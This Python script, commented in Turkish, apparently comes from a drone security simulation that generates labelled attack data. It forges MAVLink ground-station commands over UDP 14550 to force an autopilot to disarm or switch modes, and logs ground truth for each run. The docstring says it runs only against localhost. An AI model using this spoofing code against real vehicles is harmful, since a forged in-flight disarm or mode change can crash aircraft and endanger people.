#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""spoof_cmd.py — SAHTE KOMUT saldırısı (spoof_cmd).

Ne yapar: Kendini meşru yer istasyonu (sysid 255) gibi göstererek
proxy'nin telsiz kanalına (UDP 14550) TEHLİKELİ bir COMMAND_LONG enjekte
eder — ör. mod değişikliği veya disarm. Amaç, otopilotu meşru olmayan bir
komutla manipüle etmeye çalışan bir saldırganı taklit etmektir.

GÜVENLİK: Yalnızca 127.0.0.1 hedefine bağlanır (saldiri_temel üzerinden
zorlanır). Bu betik yalnızca kendi simülasyonumuz içindir.

Kullanım:
    python betikler/saldirilar/spoof_cmd.py --ucus F106_spoof_cmd --sure 30 \
        --baslangic-gecikme 60
"""

from __future__ import annotations

import time

import saldiri_temel as st
import ortak
from pymavlink import mavutil


def main() -> int:
    ap = st.temel_arg_parser(__doc__)
    ap.add_argument(
        "--komut",
        default="disarm",
        choices=["disarm", "mod_rtl", "mod_manual"],
        help="Enjekte edilecek sahte komut türü.",
    )
    args = ap.parse_args()

    cfg = ortak.config_oku()
    baglanti = st.gonderen_kur(cfg, source_system=255, source_component=190)

    st.baslangic_gecikmesi_bekle(args.baslangic_gecikme)

    ortak.log(f"Sahte komut saldırısı başlıyor: {args.komut}", "UYARI")
    start_ns = ortak.simdi_ns()
    attacker_addr = None
    hedef_sys, hedef_comp = 1, 1

    son = time.time() + args.sure
    gonderilen = 0
    while time.time() < son:
        if args.komut == "disarm":
            baglanti.mav.command_long_send(
                hedef_sys, hedef_comp,
                mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM, 0,
                0, 0, 0, 0, 0, 0, 0,  # param1=0 -> disarm
            )
        elif args.komut == "mod_rtl":
            baglanti.mav.command_long_send(
                hedef_sys, hedef_comp,
                mavutil.mavlink.MAV_CMD_DO_SET_MODE, 0,
                mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED, 11, 0, 0, 0, 0, 0,
            )
        else:  # mod_manual
            baglanti.mav.command_long_send(
                hedef_sys, hedef_comp,
                mavutil.mavlink.MAV_CMD_DO_SET_MODE, 0,
                mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED, 0, 0, 0, 0, 0, 0,
            )
        gonderilen += 1
        if attacker_addr is None:
            attacker_addr = st.attacker_addr_al(baglanti, cfg)
        time.sleep(0.5)  # saniyede ~2 sahte komut

    end_ns = ortak.simdi_ns()
    ortak.log(f"Saldırı bitti. {gonderilen} sahte komut gönderildi.", "BILGI")

    st.ground_truth_yaz(
        args.ucus, "spoof_cmd", start_ns, end_ns,
        attacker_addr or f"{cfg.get('host')}:?",
        {"komut": args.komut, "sysid": 255, "gonderilen": gonderilen}, cfg,
    )
    baglanti.close()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
